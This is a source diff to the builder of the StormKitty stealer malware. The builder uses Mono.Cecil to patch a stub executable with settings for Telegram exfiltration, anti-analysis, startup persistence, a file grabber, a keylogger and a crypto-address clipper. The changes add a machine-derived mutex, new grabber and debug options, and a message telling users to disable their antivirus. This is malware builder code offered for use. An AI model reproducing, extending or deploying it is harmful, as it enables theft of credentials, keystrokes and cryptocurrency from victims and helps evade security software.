@@ -7,22 +7,13 @@ using Mono.Cecil;
 using Mono.Cecil.Cil;
 
 using System;
-using System.Linq;
+using System.IO;
 using System.Collections.Generic;
 
 namespace StormKittyBuilder
 {
     internal sealed class build
     {
-        private static Random random = new Random();
-
-        private static string RandomString(int length)
-        {
-            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-            return new string(Enumerable.Repeat(chars, length)
-              .Select(s => s[random.Next(s.Length)]).ToArray());
-        }
-
         public static Dictionary<string, string> ConfigValues = new Dictionary<string, string>
         {
             { "Telegram API", "" },
@@ -30,6 +21,8 @@ namespace StormKittyBuilder
 
             { "AntiAnalysis", "" },
             { "Startup", "" },
+            { "Grabber", "" },
+            { "Debug", "" },
             { "StartDelay", "" },
 
             { "ClipperBTC", "" },
@@ -43,14 +36,17 @@ namespace StormKittyBuilder
             { "Keylogger", "" },
             { "Clipper", "" },
 
-            { "Mutex", RandomString(20) },
+            { "Mutex", crypt.CreateMD5($"{Environment.UserName}@{Environment.MachineName}") },
         };
 
 
         // Read stub
         private static AssemblyDefinition ReadStub()
         {
-            return AssemblyDefinition.ReadAssembly("stub\\stub.exe");
+            string stub = "stub\\stub.exe";
+            if (!File.Exists(stub))
+                cli.ShowError(stub + " not found! Try disable antivirus and download again.");
+            return AssemblyDefinition.ReadAssembly(stub);
         }
 
         // Write stub
